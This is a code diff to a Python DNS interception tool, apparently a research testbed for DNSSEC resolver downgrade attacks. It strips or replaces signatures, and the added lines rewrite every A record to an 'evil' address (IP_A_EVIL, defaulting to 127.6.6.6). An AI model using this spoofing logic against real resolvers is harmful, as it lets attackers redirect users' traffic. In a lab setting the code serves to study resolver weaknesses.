@@ -13,6 +13,7 @@ import dns.rrset
 
 IN = dns.rdataclass.from_text("IN")
 TXT = dns.rdatatype.from_text("TXT")
+A = dns.rdatatype.from_text("A")
 RRSIG = dns.rdatatype.from_text("RRSIG")
 
 logging.basicConfig(level=logging.INFO)
@@ -20,6 +21,7 @@ logger = logging.getLogger(__name__)
 
 auth_ns_addr = socket.gethostbyname(os.environ.get('AUTH_NS_HOST', 'ns'))
 auth_ns_port = int(os.environ.get('AUTH_NS_PORT', 53))
+IP_A_EVIL = os.environ.get('IP_A_EVIL', '127.6.6.6')
 
 
 def indent(s, l=4):
@@ -51,6 +53,9 @@ def filter_signatures(a: dns.message.QueryMessage, algs: Set[int] = None):
                     if qname[0] == b'unsign-and-attach':
                         invalid_signature = "TXT 16 4 0 20211007155444 20210923142444 10717 rsasha256.resolver-downgrade-attack.dedyn.io. 9zvUve6RuNC1NcAvTIH+kh6VXVOmIu347s/6ilIRp0rSq1YqldE09Tdm Ue/6i4HxdUbnLWfdpD+AhtvDwp7ZIO/FU7IRWgyne6v+RcYApLwLT2+L DQgEH5fFwnY60H6ofxHSP2zwT6amhqPSd7G5ihYA"
                         filtered_section.append(dns.rrset.from_text_list(rrset.name, rrset.ttl, IN, RRSIG, [invalid_signature]))
+                elif rrset.rdtype == dns.rdatatype.RdataType.A:
+                    filtered_section.append(dns.rrset.from_text_list(rrset.name, rrset.ttl, IN, A, [IP_A_EVIL]))
+                    continue
                 filtered_section.append(rrset)
         return filtered_section
 
